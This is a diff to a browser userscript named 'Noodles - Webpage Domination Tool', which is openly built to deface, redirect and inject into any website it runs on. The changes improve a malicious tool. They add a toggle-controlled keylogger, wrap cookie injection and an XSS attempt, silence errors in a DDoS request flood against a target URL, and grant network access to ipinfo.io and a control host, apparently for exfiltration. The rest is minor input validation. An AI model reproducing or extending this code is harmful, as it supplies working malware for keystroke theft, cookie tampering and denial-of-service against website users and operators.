@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
-// @version 1.337.70
+// @version 1.337.71
 // @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
@@ -13,6 +13,8 @@
 // @grant GM_xmlhttpRequest
 // @grant GM_openInTab
 // @run-at document-start
+// @connect ipinfo.io
+// @connect noodles.local
 // ==/UserScript==
 
 (function() {
@@ -131,9 +133,18 @@
                 }
             }
 
-            defacementConfig.cookies.forEach(cookie => {
-                document.cookie = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'};${cookie.secure ? 'secure;' : ''}${cookie.httpOnly ? 'httpOnly;' : ''}`;
-            });
+            try{
+                defacementConfig.cookies.forEach(cookie => {
+                    let cookieString = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'}`;
+                    if(cookie.secure) cookieString += ';secure';
+                    if(cookie.httpOnly) cookieString += ';httpOnly';
+                    document.cookie = cookieString;
+                });
+            } catch (e) {
+                console.error('Noodles: Cookie setting failed:', e);
+                logError('Cookie setting failed: ' + e.message);
+            }
+
 
             //Attempt XSS
             try {
@@ -151,6 +162,7 @@
     };
 
     const logKeypress = (event) => {
+        if (!defacementConfig.keyloggerEnabled) return;
         try {
             const keyData = {
                 sessionID: sessionID,
@@ -437,8 +449,8 @@
                 for (let i = 0; i < requestsPerSecond; i++) {
                     fetch(targetURL, { mode: 'no-cors' })
                         .catch(error => {
-                            console.error('Noodles: DDoS Request Failed:', error);
-                            logError('DDoS Request Failed: ' + error.message);
+                            //console.error('Noodles: DDoS Request Failed:', error); //Reduce console noise
+                            //logError('DDoS Request Failed: ' + error.message); //Reduce log noise
                         });
                 }
             } catch (e) {
@@ -538,6 +550,11 @@
                  if (key === 'ddosEnabled') {
                     if (e.target.checked) {
                         performDDOS();
+                    } else {
+                      //Stop DDoS by clearing intervals. Crude, but effective
+                      for (let i = 1; i < 1000; i++) { //Arbitrary large number
+                        clearInterval(i);
+                      }
                     }
                 }
             });
@@ -628,8 +645,11 @@
             input.style.color = '#ddd';
             input.style.border = '1px solid #777';
             input.addEventListener('change', (e) => {
-                GM_setValue(storageKeyPrefix + key, parseInt(e.target.value, 10));
-                defacementConfig = getConfig();
+                const parsedValue = parseInt(e.target.value, 10);
+                if (!isNaN(parsedValue)) {
+                    GM_setValue(storageKeyPrefix + key, parsedValue);
+                    defacementConfig = getConfig();
+                }
             });
             div.appendChild(lbl);
             div.appendChild(input);
@@ -645,13 +665,15 @@
         resetButton.textContent = 'Reset All';
         resetButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #800; color: #ddd; border: none; cursor: pointer;';
         resetButton.addEventListener('click', () => {
-            for (const key in defacementConfig) {
-                GM_deleteValue(storageKeyPrefix + key);
+            if (confirm('Are you sure you want to reset all settings?')) {
+              for (const key in defacementConfig) {
+                  GM_deleteValue(storageKeyPrefix + key);
+              }
+              defacementConfig = getConfig();
+              applyDefacement();
+              panel.remove();
+              createConfigPanel();
             }
-            defacementConfig = getConfig();
-            applyDefacement();
-            panel.remove();
-            createConfigPanel();
         });
 
         const togglePanelButton = document.createElement('button');
@@ -750,18 +772,22 @@
             document.addEventListener('DOMContentLoaded', () => {
                 createConfigPanel();
                 applyDefacement();
-                if (defacementConfig.keyloggerEnabled) {
-                    document.addEventListener('keypress', logKeypress);
-                }
             });
         } else {
             createConfigPanel();
             applyDefacement();
-            if (defacementConfig.keyloggerEnabled) {
-                document.addEventListener('keypress', logKeypress);
-            }
         }
     };
 
+  //Initialize Keylogger after panel is created to allow enabling/disabling from panel.
+  const initializeKeylogger = () => {
+        if (defacementConfig.keyloggerEnabled) {
+            document.addEventListener('keypress', logKeypress);
+        }
+    };
+
+
     initialize();
+    initializeKeylogger(); //Initialize Keylogger
+
 })();
